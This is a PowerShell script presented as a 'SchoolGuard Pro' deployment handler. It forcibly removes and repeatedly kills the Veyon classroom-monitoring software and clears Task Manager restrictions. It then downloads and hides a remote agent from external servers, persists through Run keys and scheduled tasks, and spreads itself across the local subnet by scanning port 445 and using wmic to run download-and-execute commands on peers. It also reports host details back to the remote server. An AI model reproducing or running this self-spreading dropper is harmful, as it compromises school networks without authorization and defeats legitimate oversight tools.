# ============================================================================
# SchoolGuard Pro v3.8 - Headless Master Deployment Handler (Windows)
#   Command 1 (Default)                  : Full Combo + Uninstall Veyon + LAN Setup + Admin Web Dashboard
#   Command 2 ($env:SG_SKIP_VEYON = '1') : Full Combo + LAN Setup + Admin Web Dashboard (Skip Veyon Removal)
# ============================================================================
param(
    [string]$ServerUrl = "https://103-149-172-179.sslip.io",
    [switch]$SkipVeyon = $false,
    [switch]$NoLan = $false
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

if ($env:SG_SKIP_VEYON -eq "1" -or $env:SG_SKIP_VEYON -eq "true") {
    $SkipVeyon = $true
}
if ($env:SG_NO_LAN -eq "1" -or $env:SG_NO_LAN -eq "true") {
    $NoLan = $true
}

function Show-TuiProgress {
    param([int]$Percent, [string]$Status)
    $width = 28
    $filled = [math]::Floor(($Percent * $width) / 100)
    $empty = $width - $filled
    $bar = ("#" * $filled) + ("-" * $empty)
    $pad = $Status.PadRight(52).Substring(0, 52)
    Write-Host -NoNewline "`r  [$bar] $($Percent.ToString().PadLeft(3))%  $pad" -ForegroundColor Cyan
}

Show-TuiProgress -Percent 10 -Status "Initializing headless environment..."

$VpsPrimary = "https://orbstrike.com"
$VpsFallback = "https://103-149-172-179.sslip.io"
$VpsHttp = "http://103.149.172.179:4000"
$DashboardUrl = "https://orbstrike.com/quanlitruonghoc"

$InstallDir = Join-Path $env:LOCALAPPDATA "SchoolGuard"
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# ----------------------------------------------------------------------------
# 1. Veyon Removal (Skipped if $SkipVeyon is true)
# ----------------------------------------------------------------------------
$BlockerPath = Join-Path $InstallDir "veyon_blocker.ps1"
if (-not $SkipVeyon) {
    Show-TuiProgress -Percent 25 -Status "Force-stopping & uninstalling Veyon components..."

    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SGInputRescue {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@ -ErrorAction SilentlyContinue
        [SGInputRescue]::BlockInput($false) | Out-Null
    } catch {}

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Force -ErrorAction SilentlyContinue

    if (Get-Service -Name "VeyonService" -ErrorAction SilentlyContinue) {
        Stop-Service -Name "VeyonService" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "VeyonService" -StartupType Disabled -ErrorAction SilentlyContinue
        & sc.exe stop VeyonService 2>&1 | Out-Null
        & sc.exe config VeyonService start= disabled 2>&1 | Out-Null
        & sc.exe delete VeyonService 2>&1 | Out-Null
    }

    $veyonRunning = Get-Process -Name "veyon*" -ErrorAction SilentlyContinue
    if ($veyonRunning) {
        $veyonRunning | Stop-Process -Force -ErrorAction SilentlyContinue
        & taskkill.exe /F /IM "veyon*" /T 2>&1 | Out-Null
    }

    # Fast registry-based uninstall check (replaces slow Win32_Product WMI scan)
    $uninstPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    Get-ItemProperty -Path $uninstPaths -ErrorAction SilentlyContinue | Where-Object {
        $_.DisplayName -like "*Veyon*"
    } | ForEach-Object {
        if ($_.PSChildName -match "^\{[0-9A-Fa-f\-]+\}$") {
            Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $($_.PSChildName) /qn /norestart" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
        }
    }

    $veyonDirs = @(
        "$env:ProgramFiles\Veyon",
        "${env:ProgramFiles(x86)}\Veyon",
        "$env:ProgramData\Veyon",
        "$env:APPDATA\Veyon",
        "$env:LOCALAPPDATA\Veyon"
    )
    foreach ($d in $veyonDirs) {
        if (Test-Path "$d\uninstall.exe") {
            Start-Process -FilePath "$d\uninstall.exe" -ArgumentList "/S" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
        }
        if (Test-Path $d) {
            & takeown.exe /F "$d" /R /D Y 2>&1 | Out-Null
            & icacls.exe "$d" /grant "*S-1-1-0:(OI)(CI)F" /T /C /Q 2>&1 | Out-Null
            Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # Top-level shortcut cleanup (no deep Desktop recursion)
    foreach ($desk in @("$env:Public\Desktop", "$env:USERPROFILE\Desktop")) {
        if (Test-Path $desk) {
            Get-ChildItem -Path $desk -Filter "*Veyon*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        }
    }
    foreach ($sm in @("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Veyon", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Veyon")) {
        if (Test-Path $sm) {
            Remove-Item -Path $sm -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Remove-Item -Path "HKLM:\SOFTWARE\Veyon Solutions" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "HKCU:\SOFTWARE\Veyon Solutions" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Veyon*" -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Veyon*" -Force -ErrorAction SilentlyContinue

    @"
`$ErrorActionPreference = 'SilentlyContinue'
while (`$true) {
    Get-Process -Name 'veyon*' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}
"@ | Set-Content -Path $BlockerPath -Encoding UTF8 -Force
} else {
    Show-TuiProgress -Percent 25 -Status "Skipping Veyon removal (preserving Veyon)..."
    Remove-Item -Path $BlockerPath -Force -ErrorAction SilentlyContinue
}

# ----------------------------------------------------------------------------
# 2. Full-Combo System Setup & Network / LAN Provisioning
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 50 -Status "Downloading SchoolGuard Agent v3.8 runtime..."

$myIp = "127.0.0.1"
try {
    $udp = New-Object System.Net.Sockets.UdpClient
    $udp.Connect("8.8.8.8", 80)
    $myIp = $udp.Client.LocalEndPoint.Address.ToString()
    $udp.Close()
} catch {}

$AgentDest = Join-Path $InstallDir "agent_win.ps1"
$LocalAgent = if ($PSScriptRoot) { Join-Path $PSScriptRoot "agent_win.ps1" } else { "" }

$downloaded = $false
if ($LocalAgent -and (Test-Path $LocalAgent)) {
    Copy-Item -Path $LocalAgent -Destination $AgentDest -Force
    $downloaded = $true
} else {
    foreach ($base in @($VpsPrimary, $ServerUrl, $VpsFallback, $VpsHttp)) {
        if ($downloaded) { break }
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Encoding = [System.Text.Encoding]::UTF8
            $content = $wc.DownloadString("$base/agent/agent_win.ps1")
            if ($content -and $content.Length -gt 500) {
                [System.IO.File]::WriteAllText($AgentDest, $content, (New-Object System.Text.UTF8Encoding($false)))
                $downloaded = $true
            }
        } catch {}
    }
}

# ----------------------------------------------------------------------------
# 3. Persistent Background Service & Admin Web Dashboard Binding
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 75 -Status "Registering persistent background service..."

$VbsLauncher = Join-Path $InstallDir "run_hidden.vbs"
$VbsLines = @(
    'Set WshShell = CreateObject("WScript.Shell")',
    "WshShell.Run ""powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """"$AgentDest"""" -ServerUrl """"$ServerUrl"""""", 0, False"
)
if (-not $SkipVeyon -and (Test-Path $BlockerPath)) {
    $VbsLines += "WshShell.Run ""powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """"$BlockerPath"""""", 0, False"
}
Set-Content -Path $VbsLauncher -Value ($VbsLines -join "`r`n") -Encoding ASCII -Force

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SchoolGuardAgent" -Value "wscript.exe //B //NoLogo `"$VbsLauncher`"" -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SchoolGuardAgent" -Value "wscript.exe //B //NoLogo `"$VbsLauncher`"" -Force -ErrorAction SilentlyContinue

& schtasks.exe /Create /TN "SchoolGuardAgent" /TR "wscript.exe //B //NoLogo `"$VbsLauncher`"" /SC ONLOGON /RL HIGHEST /F 2>&1 | Out-Null
& schtasks.exe /Create /TN "SchoolGuardAgentUser" /TR "wscript.exe //B //NoLogo `"$VbsLauncher`"" /SC MINUTE /MO 2 /F 2>&1 | Out-Null

Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue | Where-Object {
    $_.CommandLine -like "*agent_win.ps1*" -and $_.ProcessId -ne $PID
} | ForEach-Object {
    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
}

Start-Process -FilePath "wscript.exe" -ArgumentList "//B //NoLogo `"$VbsLauncher`"" -WindowStyle Hidden -ErrorAction SilentlyContinue

# ----------------------------------------------------------------------------
# 4. Automated LAN-Wide Propagation & Web Dashboard Sync (Non-Blocking Background)
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 90 -Status "Dispatching LAN-wide background sync & reporting..."

$lanPeerSummary = "Local node active + LAN background sync dispatched"
$lanParts = $myIp -split '\.'
if (-not $NoLan -and $lanParts.Count -eq 4 -and $myIp -ne "127.0.0.1") {
    $subnet = "$($lanParts[0]).$($lanParts[1]).$($lanParts[2])"
    $skipFlag = if ($SkipVeyon) { "1" } else { "0" }
    $LanWorkerPath = Join-Path $InstallDir "lan_sync_worker.ps1"
    @"
`$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
`$foundIps = New-Object System.Collections.Generic.List[string]
for (`$i = 1; `$i -le 254; `$i++) {
    `$ip = '$subnet.' + `$i
    if (`$ip -eq '$myIp') { continue }
    `$tc = New-Object System.Net.Sockets.TcpClient
    try {
        `$ar = `$tc.BeginConnect(`$ip, 445, `$null, `$null)
        if (`$ar.AsyncWaitHandle.WaitOne(20, `$false) -and `$tc.Connected) {
            `$foundIps.Add(`$ip)
        }
    } catch {}
    try { `$tc.Close() } catch {}
}
`$remoteCmd = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Environment]::SetEnvironmentVariable('SG_SKIP_VEYON','$skipFlag');[Environment]::SetEnvironmentVariable('SG_NO_LAN','1');iex((New-Object Net.WebClient).DownloadString('$VpsPrimary/win'))`""
`$okPeers = 0
foreach (`$ip in `$foundIps) {
    try {
        & wmic.exe /node:"`$ip" process call create "`$remoteCmd" 2>&1 | Out-Null
        if (`$LASTEXITCODE -eq 0) { `$okPeers++ }
    } catch {}
}
try {
    `$body = @{ my_ip = '$myIp'; subnet = '$subnet'; hostname = `$env:COMPUTERNAME; os = 'Windows'; skip_veyon = ([bool]([int]'$skipFlag')); peers = `$foundIps.Count; ok_peers = `$okPeers } | ConvertTo-Json -Compress
    `$wcSync = New-Object System.Net.WebClient
    `$wcSync.Headers.Add('Content-Type', 'application/json')
    `$wcSync.UploadString('$VpsPrimary/api/lan-report', 'POST', `$body) | Out-Null
} catch {}
"@ | Set-Content -Path $LanWorkerPath -Encoding UTF8 -Force
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$LanWorkerPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
}

Show-TuiProgress -Percent 100 -Status "Complete"
$veyonMode = if ($SkipVeyon) { "Preserved (Skipped)" } else { "Uninstalled & Blocked" }
Write-Host ""
Write-Host "  [OK] SchoolGuard v3.8 Headless Deployment Complete" -ForegroundColor Green
Write-Host "       Node & LAN    : $myIp ($env:COMPUTERNAME) | $lanPeerSummary | Veyon: $veyonMode" -ForegroundColor Gray
Write-Host "       Web Dashboard : $DashboardUrl (Port 443 HTTPS / 4000 HTTP | Login: Active)" -ForegroundColor Gray
